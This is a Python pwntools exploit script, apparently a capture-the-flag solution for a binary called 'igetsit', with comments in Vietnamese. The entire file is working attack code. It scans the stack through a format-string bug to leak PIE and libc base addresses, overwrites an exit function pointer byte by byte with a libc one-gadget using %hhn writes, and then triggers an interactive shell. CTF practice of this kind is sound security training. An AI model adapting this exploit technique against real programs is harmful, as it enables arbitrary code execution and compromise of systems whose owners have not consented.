from pwn import *

exe = ELF("./igetsit", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = exe
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote('igetsit-712f50652d8d7adb.instancer.batmans.kitchen', 1337, ssl=True)
    else:
        return process("./igetsit")

p = start()

def write_bin(idx, data: bytes):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", data)

def read_bin_custom(idx, get_as):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", str(get_as).encode())

# ==========================================================
# BƯỚC 1: Quét Stack tự động lấy PIE Base và Libc Base
# ==========================================================
log.info("Scanning stack for leaks...")
pie_base = None
libc_base = None

for i in range(10, 35):
    fmt = f"%{i}$p\x00".encode()
    # p64() của Linux pointer luôn có \x00 ở byte thứ 7,8
    # strlen(bin0) sẽ luôn <= 8, bypass hoàn hảo cơ chế chống tràn của bài!
    payload = b"A"*7 + b"\x00" + b"B"*(0x800 - 8) + fmt
    write_bin(0, payload)
    read_bin_custom(0, 5) 
    
    p.recvuntil(b"Not an option\n")
    leak = p.recvline().strip()
    
    if leak.startswith(b"0x"):
        val = int(leak, 16)
        if pie_base is None and (val & 0xfff) == 0x0a0:
            pie_base = val - 0x40a0
            log.success(f"PIE Base: {hex(pie_base)}")
        if libc_base is None and (val & 0xfff) in (0x083, 0x0b3) and val > 0x700000000000:
            libc_base = val - 0x24083
            log.success(f"Libc Base: {hex(libc_base)}")
            
    if pie_base and libc_base:
        break

if not pie_base or not libc_base:
    log.error("Failed to leak PIE or Libc.")
    exit(1)

# ==========================================================
# BƯỚC 2: Target Exit Wrapper và chuẩn bị One Gadget
# ==========================================================
# Từ Ghidra: FUN_00101170 gọi (*_DAT_00104060)()
exit_hook = pie_base + 0x4060 

# Các One Gadget thông dụng của Ubuntu 20.04 (Glibc 2.31)
# Nếu offset đầu tiên không hoạt động, hãy đổi sang index 1 hoặc 2
one_gadgets = [0xe3b01, 0xe3afe, 0xe3b04]
one_gadget_addr = libc_base + one_gadgets[0]

log.info(f"Targeting Exit Hook: {hex(exit_hook)}")
log.info(f"One Gadget: {hex(one_gadget_addr)}")
log.info("Overwriting exit hook byte by byte (100% stable)...")

# ==========================================================
# BƯỚC 3: Format String Arbitrary Write
# ==========================================================
for i in range(6):
    target_addr = exit_hook + i
    byte_val = (one_gadget_addr >> (i * 8)) & 0xff
    
    if byte_val == 0:
        fmt = f"%1$hhn\x00"
    else:
        fmt = f"%{byte_val}c%1$hhn\x00"
        
    payload = p64(target_addr) + b"B"*(0x800 - 8) + fmt.encode()
    
    write_bin(0, payload)
    read_bin_custom(0, 5)

log.success("Exit hook overwritten successfully!")

# ==========================================================
# BƯỚC 4: Trigger Shell
# ==========================================================
log.info("Triggering shell by choosing Exit (Option 3)...")

# Chọn Menu 3 để thoát vòng lặp, kích hoạt Exit Hook (One Gadget)
p.sendlineafter(b"> ", b"3")

p.interactive()